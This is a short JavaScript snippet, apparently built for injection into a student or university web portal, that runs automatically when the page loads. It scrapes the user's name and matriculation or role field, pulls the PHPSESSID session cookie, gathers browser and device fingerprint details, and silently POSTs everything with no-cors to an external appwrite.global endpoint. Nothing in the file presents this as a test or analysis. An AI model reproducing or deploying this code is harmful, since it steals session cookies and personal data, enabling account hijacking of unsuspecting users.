function GetUserDetails() {
    var userDetails = {
        name: document.querySelector('.user-name') ? document.querySelector('.user-name').textContent : "Unavailable",
        matric: document.querySelector('.user-role') ? document.querySelector('.user-role').textContent : "Unavailable"
    };

    document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name == 'PHPSESSID') {userDetails['phpsess'] = value; }
    });

    return userDetails
}

// Get detailed device information
function getDeviceInfo() {
    return {
        "browser": navigator.userAgent,
        "screen": `${window.screen.width}x${window.screen.height}`,
        "viewport": `${window.innerWidth}x${window.innerHeight}`,
        "CPU": navigator.hardwareConcurrency || 0,
        "memory": navigator.deviceMemory || 0,
        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "system": navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
    };
}


async function storeData(device, user) {
    const res = await fetch('https://673d53a375a6942d9bd2.appwrite.global/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            'user': user,
            'device': device
        }),
        mode: 'no-cors'
    })

    console.log(res)
}

(_ => {
    const device = getDeviceInfo()
    const user = GetUserDetails()
    storeData(device, user)
})()